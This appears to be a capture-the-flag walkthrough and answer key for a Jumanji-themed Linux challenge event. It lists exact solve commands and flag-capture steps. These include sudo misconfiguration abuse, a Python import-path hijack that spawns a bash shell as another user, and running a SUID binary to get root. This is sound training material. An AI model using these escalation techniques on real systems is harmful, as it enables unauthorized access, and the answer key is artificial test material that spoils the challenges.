# 🧭 Technozion SDC Games: Master Challenge Walkthrough

This document provides the definitive, step-by-step solver guide and cheat-sheet for all active challenges across **Day 1 Level 2 (Avatars)** and **Day 2 Level 1 (Simulation Core Mainframe)**, as well as archived notes for the **Jumanji Gauntlet**.

---

## 1. Quick Tournament Scoring Matrix

| Event / Level           | Focus Area                   | Objectives / Flags                                                         | Max Score          | Progression Trigger                                  |
| :---------------------- | :--------------------------- | :------------------------------------------------------------------------- | :----------------- | :--------------------------------------------------- |
| **Day 1 Level 2** | Jungle Recon & Cryptanalysis | 5 Avatars (`bravestone`, `ruby`, `finbar`, `oberon`, `seaplane`) | **150 PTS**  | Victory video (`jumanji_win.mp4`) & Hub completion |
| **Day 2 Level 1** | Mainframe Core & PrivEsc     | 2 Overrides (`day2_level1_user` 80 pts, `day2_level1_root` 120 pts)    | **200 PTS**  | Purge video (`round3_win.mp4`) & auto-completion   |
| *(Archived)* Gauntlet | Multi-Team Co-op Tournament  | Pod Relics, Duels, Shrine KotH (Archived in `archive/gauntlet`)          | **Archived** | Safely isolated; redirects to `/hub`               |

---

## 2. Day 1 Level 2: Avatar Reconnaissance (150 Points)

When players access `/level2`, an interactive Linux container terminal (`recon_user@sdc-day1-level2:~$`) is provisioned.

### Hints

```bash
parrot_hint 1    # Bravestone clue
parrot_hint 2    # Ruby Roundhouse clue
parrot_hint 3    # Mouse Finbar clue
parrot_hint 4    # Professor Oberon clue
parrot_hint 5    # Seaplane McDonough clue
```

### Challenge 2.1: Dr. Smolder Bravestone (20 PTS)

- **Concept**: Deep directory navigation and hidden dotfile reconnaissance.
- **Location**: `/opt/jungle/ruins/.bravestone_relic`
- **Solve Command**:
  ```bash
  cat /opt/jungle/ruins/.bravestone_relic
  complete $(cat /opt/jungle/ruins/.bravestone_relic)
  ```

### Challenge 2.2: Ruby Roundhouse (30 PTS)

- **Concept**: Cryptanalysis & Base64 decoding.
- **Location**: `/home/recon_user/Documents/ruby_dance_moves.txt`
- **Solve Command**:
  ```bash
  cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d
  complete $(cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d)
  ```

### Challenge 2.3: Franklin "Mouse" Finbar (25 PTS)

- **Concept**: Sudo misconfiguration enumeration.
- **Enumeration**: `sudo -l` reveals `(finbar_admin) NOPASSWD: /bin/cat /home/finbar_admin/flag.txt`
- **Solve Command**:
  ```bash
  sudo -u finbar_admin cat /home/finbar_admin/flag.txt
  complete $(sudo -u finbar_admin cat /home/finbar_admin/flag.txt)
  ```

### Challenge 2.4: Professor Shelly Oberon (35 PTS)

- **Concept**: Process table enumeration & environmental analysis.
- **Enumeration**: `ps aux | grep cartographer`
- **Solve Command**:
  ```bash
  ps aux | grep cartographer | grep -o 'JUMANJI{[^}]*}'
  complete $(ps aux | grep cartographer | grep -o 'JUMANJI{[^}]*}')
  ```

### Challenge 2.5: Jefferson "Seaplane" McDonough (40 PTS)

- **Concept**: Localhost port scanning & HTTP microservice exploitation.
- **Enumeration**: `curl -s http://127.0.0.1:5000/api/coordinates`
- **Solve Command**:
  ```bash
  curl -s http://127.0.0.1:5000/api/coordinates | grep -o 'JUMANJI{[^}]*}'
  complete $(curl -s http://127.0.0.1:5000/api/coordinates | grep -o 'JUMANJI{[^}]*}')
  ```

---

## 3. Day 2 Level 1: Simulation Core Mainframe (200 Points)

When players access `/day2/level1` (or legacy `/level3`), an interactive security terminal (`recon_user@sdc-day2-level1:~$`) is provisioned.

### Step 3.1: Database Extraction (80 PTS)

- **Concept**: SQLite relational schema reconnaissance, decoy discrimination, and forensic log analysis.
- **Lore Guidance**: Consult Alan Parrish's Field Journal (`cat parrish_journal.txt` Entry 1) and `/var/log/mainframe/node_state.log`.
- **Location**: `/level1/mainframe.db` (configured via `/level1/.env`)
- **Inspection & Analysis**:
  ```bash
  cat .env
  cat /var/log/mainframe/node_state.log
  # Confirms Node 1 ('admin_access') is the ONLINE production node; others are decoys
  sqlite3 /level1/mainframe.db ".schema"
  ```
- **Solve Command**:
  ```bash
  sqlite3 /level1/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';"
  deploy_override $(sqlite3 /level1/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';")
  ```

### Step 3.2: Lateral Escalation to `jumanji_admin`

- **Concept**: Python search path hijacking via sudo-permitted maintenance script.
- **Lore Guidance**: Alan Parrish's Field Journal (`cat parrish_journal.txt` Entry 2: *"The caretaker's audit hound searches only where it stands... plant your own seed in the dirt beneath your boots, name it vault_utils..."*).
- **Sudo Discovery**:
  ```bash
  sudo -l
  # Output: (jumanji_admin) NOPASSWD: /opt/jumanji/maintenance/audit_vault.py
  ```
- **Exploitation**:
  ```bash
  cd /level1
  cat << 'EOF' > vault_utils.py
  import os, pty
  pty.spawn("/bin/bash")
  EOF
  sudo -u jumanji_admin /opt/jumanji/maintenance/audit_vault.py
  # Spawns interactive shell as jumanji_admin!
  ```

### Step 3.3: SUID Binary Reversing & Root Escalation (120 PTS)

- **Concept**: Stripped ELF reverse engineering, XOR stack string de-obfuscation, environment variable ritual injection, and argument sigil validation.
- **Lore Guidance**: Alan Parrish's Field Journal Entry 3 (432 Hz resonance frequency, 1995 awakening year) & Nigel Billingsley's radio comms (`nigel_comms`).
- **Binary**: `/home/jumanji_admin/lift_curse` (Permissions: `-rwsr-xr-x 1 root root`, stripped)
- **Reversing / Dynamic Analysis**:
  ```bash
  # Binary execution without ritual:
  /home/jumanji_admin/lift_curse
  # [JUMANJI ALTAR] The stone jaguar's eyes remain cold... Imbue environment with JUMANJI_RITUAL

  # Binary execution with ritual:
  JUMANJI_RITUAL=CHANT_432HZ /home/jumanji_admin/lift_curse
  # [JUMANJI ALTAR] The jaguar's ruby eyes flare red! ... Challenge with: lift_curse --awaken <SIGIL>
  ```
- **Escalation & Solve Command**:
  ```bash
  export JUMANJI_RITUAL="CHANT_432HZ"
  /home/jumanji_admin/lift_curse --awaken 1995

  # Inside root shell:
  cat /root/core_override.txt
  deploy_override $(cat /root/core_override.txt)
  ```

---

## 4. Archived Reference: The Jumanji Gauntlet (`archive/gauntlet`)

> [!NOTE]
> The Jumanji Gauntlet tournament engine has been archived and removed from active competition. The documentation below is retained for architectural reference.

In Day 2 Level 2, squads consisted of **strictly 2 players**:

1. **Player 1 (Navigator)**: Terminal CLI inside container (`recon_user@<team>-day2-level2:~$`).
2. **Player 2 (Cartographer)**: Web telemetry HUD (`/gauntlet`).

### Core Mechanism: Asymmetric Split Keys

Neither player can score alone. Every relic requires:

1. Navigator extracts: `NAV_RELIC_hash`
2. Cartographer reads on HUD: `CART_RELIC_hash`
3. Combined submission:
   ```bash
   complete JUMANJI{relic_navhash_carthash}
   ```

### Phase 1: Jungle Pods Relics

- **Sun Compass (`compass`, 25 PTS)**:
  - *Navigator*: Runs `nc 127.0.0.1 4141` or `telnet 127.0.0.1 4141` to read `NAV_COMPASS_...`.
  - *Cartographer*: Reads `CART_COMPASS_...` on web radar.
  - *Submit*: `complete JUMANJI{compass_<nav>_<cart>}`
- **Obsidian Blade (`blade`, 35 PTS)**:
  - *Navigator*: `sudo -u blade_keeper find /opt/jungle/blade_vault -name "*.key" -exec cat {} +`
  - *Cartographer*: Reads `CART_BLADE_...` on web radar.
  - *Submit*: `complete JUMANJI{blade_<nav>_<cart>}`
- **Jaguar Fang (`jaguar`, 40 PTS)**:
  - *Navigator*: `cat /opt/jungle/jaguar_shrine/.totem_cipher | base64 -d`
  - *Cartographer*: Reads `CART_JAGUAR_...` on web radar.
  - *Submit*: `complete JUMANJI{jaguar_<nav>_<cart>}`
- **Golden Idol (`idol`, 50 PTS)**:
  - *Navigator*: `ps aux | grep idol_keeper`
  - *Cartographer*: Reads `CART_IDOL_...` on web radar.
  - *Submit*: `complete JUMANJI{idol_<nav>_<cart>}`

### Phase 2: Mirror Temple Duels (Head-to-Head)

- 4 head-to-head matches between top 2 squads from each Pod.
- Solving relics awards **Tactical Curse Cards** (`quicksand`, `monkeys`, `fog_of_war`, `stampede`) to cast via the Cartographer HUD drawer.

### Phase 3: Shrine of the Sacred Jaguar (King of the Hill)

- The **Top 4 Teams** enter the Shrine.
- Active ruler holds the altar for **+10 PTS** per 20-second background tick.
- Claims submitted via `claim_shrine <ACCESS_CODE>` or assigned via Game Master Mission Control.

### Phase 4: The Final Roll (Championship Match)

- Top 2 finalist squads compete for `final_jewel` ("The Eye of the Jaguar", 100 PTS).
- Ephemeral root exploit:
  ```bash
  export CHANT="JUMANJI_GAUNTLET"
  /usr/local/bin/lift_gauntlet
  cat /root/final_jewel.txt
  complete $(cat /root/final_jewel.txt)
  ```
- Crowned tournament champion! Top 4 teams exported to CSV via `/admin/export-gauntlet-finalists`.
